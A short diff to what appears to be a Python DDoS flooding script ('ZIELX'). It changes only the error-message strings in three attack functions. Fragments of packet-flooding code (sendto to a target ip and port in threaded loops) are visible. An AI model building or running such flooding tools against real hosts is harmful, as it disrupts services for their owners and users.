@@ -60,7 +60,7 @@ def ddos():
 				s.sendto(data,addr)
 			print(i +"\u001b[31m ZIELX ATTACKING IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))
 		except:
-			print("\u001b[31m ZIELX ATTACKING IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))
+			print("\u001b[31m[×] ZIELX ATTACKING IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))
 
 
 def ddos2():
@@ -76,7 +76,7 @@ def ddos2():
 			print(i +"\u001b[31m ZIELX ATTACKING IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))
 		except:
 			s.close()
-			print("\u001b[31m ZIELX ATTACKING IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))
+			print("\u001b[31m[×] ZIELX ATTACKING IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))
 
 
 def ddos3():
@@ -92,7 +92,7 @@ def ddos3():
 			print(i +"\u001b[31m ZIELXXX ATTACKING TO\033[92m ====> {}:{} \u001b[31m".format(ip, port))
 		except:
 			s.close()
-			print("\u001b[31m ZIELX ATTACKING IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))
+			print("\u001b[31m[×] ZIELX ATTACKING IP\033[92m ====> {}:{} \u001b[31m".format(ip, port))
 
 
 for y in range(threads):
